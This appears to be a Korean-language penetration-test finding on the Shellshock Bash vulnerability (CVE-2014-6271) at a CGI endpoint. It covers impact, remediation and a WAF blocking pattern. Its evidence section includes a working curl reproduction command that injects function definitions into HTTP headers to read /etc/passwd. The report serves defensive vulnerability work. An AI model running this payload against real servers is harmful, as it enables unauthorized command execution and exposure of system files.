## ShellShock - Remote Code Execution
- **End-Point**: `http://10.64.154.209/cgi-bin/test.cgi/cgi-bin/test`
- **영향**: 원격 코드 실행(RCE)을 통해 공격자가 대상 시스템에 대한 비인가 접근 권한을 획득하고, 데이터 탈취 및 전체 시스템을 장악할 수 있는 심각한 위협이 발생함.
- **설명**: GNU Bash 4.3 이하 버전에서 환경 변수 값에 포함된 함수 정의 뒤의 문자열을 부적절하게 처리하여 발생하는 취약점(CVE-2014-6271)으로, Apache mod_cgi나 OpenSSH 등 Bash를 호출하는 서비스의 환경 변수를 조작하여 임의의 시스템 명령어를 실행할 수 있음.
- **근거**: HTTP 헤더(Cookie, Referer, Shellshock 등)에 Bash 함수 정의와 함께 `/etc/passwd` 파일을 읽는 명령어를 삽입하여 전송 시 취약점이 노출됨을 확인하였으며, 재현 명령어는 다음과 같음: `curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' 'http://10.64.154.209/cgi-bin/test.cgi/cgi-bin/test'`
- **대응**: 취약점이 해결된 최신 버전의 Bash로 즉시 업데이트를 수행하고, 외부 입력값이 Bash 환경 변수로 직접 전달되지 않도록 CGI 스크립트 및 관련 설정을 검토함.
- **조치**: 운영체제별 패키지 관리 도구를 사용하여 Bash 패치를 적용(`yum update bash` 또는 `apt-get install --only-upgrade bash`)하고, WAF(웹 방화벽) 등을 통해 특수 문자열(`() { :; };`)이 포함된 악성 요청을 차단함.
